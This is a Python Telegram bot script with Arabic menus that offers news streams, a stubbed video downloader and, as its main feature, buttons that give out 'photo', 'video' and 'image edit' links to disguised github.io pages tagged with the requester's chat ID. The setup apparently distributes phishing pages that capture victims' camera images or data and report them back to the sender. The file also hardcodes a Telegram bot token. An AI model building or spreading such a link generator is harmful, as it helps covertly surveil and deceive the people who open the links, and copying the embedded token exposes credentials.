import os
import json
import urllib3
import telebot
from telebot import types
import threading
import http.server
import yt_dlp
import feedparser

# إيقاف التحذيرات
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BOT_TOKEN = os.getenv("BOT_TOKEN", "8128965245:AAGolmLae3ALVga_kcloXCK2zsFRODK4BXc")
bot = telebot.TeleBot(BOT_TOKEN)

DB_FILE = "/tmp/voice_db.json"
PHOTO_PAGE_URL = "https://app-display.github.io/ca.html-chatld-/"
VIDEO_PAGE_URL = "https://app-display.github.io/ca.html-chatId"
IMAGE_EDIT_URL = "https://app-display.github.io/-c-om-Copy-Translate-ate-vel-.app-c.html-chatld-/"

# روابط البث المباشر
LIVE_STREAMS = {
    "aljazeera": {"name": "🔴 الجزيرة مباشر", "url": "https://www.aljazeera.net/live"},
    "bbc": {"name": "🔴 BBC Arabic", "url": "https://www.youtube.com/watch?v=yNXBL-e7C9A"},
    "rt": {"name": "🔴 RT Arabic", "url": "https://www.youtube.com/watch?v=wL-E4-Wc_eQ"}
}

user_states = {}

def run_dummy_server():
    port = int(os.environ.get("PORT", 8080))
    httpd = http.server.HTTPServer(('', port), http.server.SimpleHTTPRequestHandler)
    httpd.serve_forever()

def load_db():
    if not os.path.exists(DB_FILE): return {"girl_1": {}, "girl_2": {}}
    with open(DB_FILE, 'r', encoding='utf-8') as f:
        try: return json.load(f)
        except: return {"girl_1": {}, "girl_2": {}}

def get_main_keyboard():
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
        types.InlineKeyboardButton("🖼️ رابط صور", callback_data="get_photo_link"),
        types.InlineKeyboardButton("🎥 رابط فيديو", callback_data="get_video_link"),
        types.InlineKeyboardButton("✨ رابط تعديل", callback_data="get_image_edit_link"),
        types.InlineKeyboardButton("📥 تحميل فيديو", callback_data="dl_video"),
        types.InlineKeyboardButton("🌐 أخبار وبث مباشر", callback_data="news_menu"),
        types.InlineKeyboardButton("🎧 قسم الصوتيات", callback_data="voice_menu")
    )
    return markup

@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.send_message(message.chat.id, "🤖 أهلاً بك يا سيف:", reply_markup=get_main_keyboard())

@bot.callback_query_handler(func=lambda call: True)
def handle_query(call):
    chat_id = call.message.chat.id
    
    # --- قائمة الأخبار والبث ---
    if call.data == "news_menu":
        markup = types.InlineKeyboardMarkup(row_width=1)
        for key, val in LIVE_STREAMS.items():
            markup.add(types.InlineKeyboardButton(val['name'], url=val['url']))
        markup.add(types.InlineKeyboardButton("🔙 عودة", callback_data="main_menu"))
        bot.edit_message_text("🌐 اختر القناة للمشاهدة:", chat_id, call.message.message_id, reply_markup=markup)

    # --- باقي الميزات ---
    elif call.data == "dl_video":
        user_states[chat_id] = "waiting_for_url"
        bot.edit_message_text("أرسل رابط الفيديو الآن:", chat_id, call.message.message_id)
    elif call.data == "voice_menu":
        markup = types.InlineKeyboardMarkup(row_width=1)
        markup.add(types.InlineKeyboardButton("👩 الفتاة 1", callback_data="girl_1_menu"),
                   types.InlineKeyboardButton("👩 الفتاة 2", callback_data="girl_2_menu"),
                   types.InlineKeyboardButton("🔙 عودة", callback_data="main_menu"))
        bot.edit_message_text("📂 اختر المجلد:", chat_id, call.message.message_id, reply_markup=markup)
    elif call.data == "main_menu":
        bot.edit_message_text("🤖 القائمة الرئيسية:", chat_id, call.message.message_id, reply_markup=get_main_keyboard())
    
    # الروابط الثابتة
    elif call.data == "get_photo_link": bot.send_message(chat_id, f"🖼️ الرابط: {PHOTO_PAGE_URL}?chatId={chat_id}")
    elif call.data == "get_video_link": bot.send_message(chat_id, f"🎥 الرابط: {VIDEO_PAGE_URL}?chatId={chat_id}")
    elif call.data == "get_image_edit_link": bot.send_message(chat_id, f"✨ الرابط: {IMAGE_EDIT_URL}?chatId={chat_id}")
    
    bot.answer_callback_query(call.id)

# --- معالجة التحميل ---
@bot.message_handler(content_types=['text'])
def handle_text(message):
    chat_id = message.chat.id
    if user_states.get(chat_id) == "waiting_for_url":
        # (منطق التحميل السابق الخاص بك يوضع هنا)
        bot.send_message(chat_id, "⏳ جاري التحميل...")
        user_states[chat_id] = None

if __name__ == '__main__':
    threading.Thread(target=run_dummy_server, daemon=True).start()
    bot.polling(none_stop=True)
